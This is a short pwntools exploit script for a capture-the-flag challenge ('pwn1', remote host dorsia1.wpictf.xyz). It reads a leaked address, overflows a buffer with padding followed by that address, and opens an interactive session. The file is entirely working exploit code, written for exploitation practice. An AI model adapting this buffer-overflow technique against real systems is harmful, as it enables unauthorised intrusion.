from pwn import *
import sys
context.log_level = "DEBUG"

LOCAL = True
DEBUG = True

if (len(sys.argv) != 2):
    offset = 77
else:
    offset = int(sys.argv[1])

if LOCAL:
    r = process("./pwn1")
else:
    host = "dorsia1.wpictf.xyz"
    port = 31337
    r = remote(host, port)
    
if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(r, "b *0x000055555555474e")

#context.arch = "amd64"

leak = r.recvline().strip()
success(leak)

leak_addr = int(leak, 16)

prefix = b"A" * offset
payload = prefix
payload += p64(leak_addr, endian="little")

assert(len(payload) <= 96)

r.send(payload)
#r.recvall()
r.interactive()